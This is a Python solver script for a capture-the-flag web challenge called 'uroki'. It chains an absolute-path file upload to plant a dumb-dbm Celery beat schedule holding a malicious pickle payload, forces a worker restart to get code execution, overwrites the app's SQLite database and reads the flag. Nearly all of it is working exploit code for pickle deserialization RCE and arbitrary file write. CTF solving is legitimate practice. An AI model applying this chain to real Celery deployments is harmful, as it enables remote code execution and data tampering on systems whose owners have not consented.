#!/usr/bin/env python3
"""
uroki (web) solver, step 2: code execution as the 'app' user via celery beat schedule.

Facts (from the task source):
  * /flag.txt is chowned to app and chmod 0000 by entrypoint.sh -> app cannot read it,
    but app OWNS it, so app code can chmod it.
  * celery worker (user app, cwd /data) runs beat embedded (-B) with the default
    PersistentScheduler, schedule file 'celerybeat-schedule' in cwd (/data).
  * PersistentScheduler.setup_schedule() calls self._store.get('tz'), i.e. it unpickles
    the value of key 'tz' from the shelve -> pickle RCE.
  * dbm.whichdb() checks dumb-dbm files ('<name>.dat' + '<name>.dir') BEFORE the bare
    gdbm file, so uploading a dumb pair makes the next worker start open our payload.
  * Every lesson create/edit/cancel runs `supervisorctl restart celery` (ops.py), so
    POST /lesson restarts the worker and makes it re-read the schedule.
  * upload_attachment() writes to the given absolute path (clean_name keeps leading '/'),
    and then set_attachment() updates a row in /data/uroki.db -> the helper lesson id must exist.

Payload: os.system('chmod 644 /flag.txt'). After the restart, /flag.txt is readable and is
served by GET /lesson/2/file when lesson 2 in /data/uroki.db points at /flag.txt.

Env: INST_ENDPOINT=http://<host>, HELPER_ID=<existing lesson id> (optional).
"""
import datetime
import os
import pickle
import re
import sqlite3
import subprocess
import sys
import tempfile
import time

BASE = os.environ.get("INST_ENDPOINT", "").rstrip("/")
TMP = tempfile.gettempdir()


def curl(args, text=False):
    r = subprocess.run(["curl.exe", "-sS", "-m", "90"] + args, capture_output=True)
    if r.returncode != 0:
        raise RuntimeError("curl: " + r.stderr.decode(errors="replace"))
    return r.stdout.decode("utf-8", errors="replace") if text else r.stdout


class Payload:
    def __reduce__(self):
        code = "(__import__('os').system('chmod 644 /flag.txt'), 'UTC')[1]"
        return (eval, (code,))


def make_dumb_pair(prefix):
    payload = pickle.dumps(Payload(), protocol=pickle.HIGHEST_PROTOCOL)
    dat = os.path.join(TMP, prefix + ".dat")
    dirf = os.path.join(TMP, prefix + ".dir")
    with open(dat, "wb") as f:
        f.write(payload)
    with open(dirf, "w", encoding="latin-1") as f:
        f.write("%r, %r\n" % ("tz", (0, len(payload))))
    return dat, dirf


def create_lesson():
    tomorrow = (datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=1)).strftime("%Y-%m-%d")
    h = curl(["-D", "-", "-o", "NUL", "-X", "POST", f"{BASE}/lesson",
              "--data-urlencode", "title=h", "--data-urlencode", "subject=h",
              "--data-urlencode", "teacher=h", "--data-urlencode", f"date={tomorrow}",
              "--data-urlencode", "time=10:00"], text=True)
    m = re.search(r"(?im)^location:\s*/lesson/(\d+)", h)
    if not m:
        raise RuntimeError("create lesson failed:\n" + h[:300])
    return int(m.group(1))


def upload(lid, local, dest):
    out = curl(["-o", "NUL", "-w", "%{http_code}", "-X", "POST", "-F",
                f"file=@{local};filename={dest}", f"{BASE}/lesson/{lid}/upload"], text=True)
    return out.strip()


def build_db(path, helper, target_fp):
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript("""
CREATE TABLE IF NOT EXISTS lessons (id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL,
 subject TEXT NOT NULL, teacher TEXT NOT NULL, scheduled_at INTEGER NOT NULL,
 status TEXT NOT NULL DEFAULT 'planned', homework TEXT, file_name TEXT, file_path TEXT,
 created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY AUTOINCREMENT, lesson_id INTEGER NOT NULL,
 author TEXT NOT NULL, body TEXT NOT NULL, created_at INTEGER NOT NULL);
""")
    con.execute("INSERT INTO lessons (id,title,subject,teacher,scheduled_at,status,homework,file_name,file_path,created_at)"
                " VALUES (?,'h','h','h',0,'planned','',NULL,NULL,0)", (helper,))
    con.execute("INSERT INTO lessons (id,title,subject,teacher,scheduled_at,status,homework,file_name,file_path,created_at)"
                " VALUES (2,'x','x','x',0,'done','','flag.txt',?,0)", (target_fp,))
    con.commit()
    con.close()


def main():
    if not BASE:
        sys.exit("set INST_ENDPOINT")

    helper = int(os.environ["HELPER_ID"]) if os.environ.get("HELPER_ID") else create_lesson()
    print(f"[*] helper lesson {helper}")

    dat, dirf = make_dumb_pair("celerybeat-schedule-payload")
    print("[*] upload dumb pair as /data/celerybeat-schedule.{dat,dir}")
    print("   dat:", upload(helper, dat, "/data/celerybeat-schedule.dat"))
    print("   dir:", upload(helper, dirf, "/data/celerybeat-schedule.dir"))

    print("[*] restart celery via lesson create")
    restart_lesson = create_lesson()
    print(f"    created lesson {restart_lesson}")
    time.sleep(15)

    print("[*] restore crafted uroki.db (lesson 2 -> /flag.txt)")
    target = os.path.join(TMP, "uroki_beat_restore.db")
    build_db(target, restart_lesson, "/flag.txt")
    print("   upload:", upload(restart_lesson, target, "/data/uroki.db"))

    body = curl(["-s", "-m", "30", "-i", f"{BASE}/lesson/2/file"], text=True)
    print(body[:300])
    m = re.search(r"ctfcup\{[^}\s]*\}", body)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[-] flag not found yet (check worker log / retry restart)")


if __name__ == "__main__":
    main()
